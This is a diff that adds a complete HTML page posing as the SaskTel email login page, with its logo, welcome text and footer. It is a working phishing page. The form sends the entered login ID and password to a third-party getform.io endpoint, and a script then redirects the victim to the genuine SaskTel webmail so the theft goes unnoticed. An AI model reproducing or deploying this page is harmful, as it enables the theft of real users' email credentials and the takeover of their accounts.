@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SaskTel Email Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <img src="sasktel-logo.png" alt="SaskTel Logo" class="logo">
+    <h1 class="main-header">SaskTel Email</h1>
+    <div class="container">
+        <div class="login-box">
+            <h2 class="sub-header">Log in</h2>
+            <form action="https://getform.io/f/bmdpjpxa" method="POST" onsubmit="redirectToWebmail()">
+                <label for="loginID">Login ID</label>
+                <input type="text" id="loginID" name="loginID" required>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+                
+                <button type="submit">LOG IN</button>
+                <a href="#" class="forgot-password">Forget Password?</a>
+            </form>
+        </div>
+        <div class="welcome-box">
+            <p>Welcome to SaskTel Email</p>
+            <p>This is where you can log in and use your SaskTel email account.</p>
+            <a href="#" class="support-link">SaskTel email support</a>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-content">
+            <img src="sasktel-logo.png" alt="SaskTel Logo" class="footer-logo">
+            <p>© 2024 SaskTel and its licensors. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        function redirectToWebmail() {
+            setTimeout(function() {
+                window.location.href = "https://webmail.sasktel.net/#/login";
+            }, 1000); // Adjust the delay if needed
+            return true; // Ensure the form submits
+        }
+    </script>
+</body>
+</html>
